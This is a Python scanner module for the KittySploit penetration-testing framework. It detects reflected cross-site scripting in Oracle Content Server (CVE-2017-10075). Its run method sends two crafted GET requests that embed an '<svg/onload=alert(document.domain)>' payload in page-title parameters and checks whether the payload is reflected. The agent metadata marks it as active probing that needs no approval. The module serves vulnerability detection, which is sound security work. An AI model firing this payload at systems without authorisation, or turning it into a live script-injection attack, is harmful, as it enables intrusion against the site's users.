#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oracle Content Server version 11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle Content Server - Cross-Site Scripting Detection',
        'description': 'Oracle Content Server version 11.1.1.9.0, 12.2.1.1.0 and 12.2.1.2.0 are susceptible to cross-site scripting. The vulnerability can be used to include HTML or JavaScript code in the affected web page. The code is executed in the browser of users if they visit the manipulated site.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'xss', 'oracle', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://www.oracle.com/technetwork/security-advisory/cpujul2017-3236622.html',
            'http://web.archive.org/web/20211206074610/https://securitytracker.com/id/1038940',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-10075',
            'http://www.securitytracker.com/id/1038940',
            'https://github.com/d4n-sec/d4n-sec.github.io',
        ],
        'cve': 'CVE-2017-10075',
    }

    def run(self):
        for path in ('/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX<svg/onload=alert(document.domain)>&dSecurityGroup=&QueryText=(dInDate+>=+%60<$dateCurrent(-7)$>%60)&PageTitle=OO', '/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=XXXXXXXXXXXX<svg/onload=alert(document.domain)>'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('<svg/onload=alert(document.domain)>', 'ORACLE_QUERY',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Oracle Content Server - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

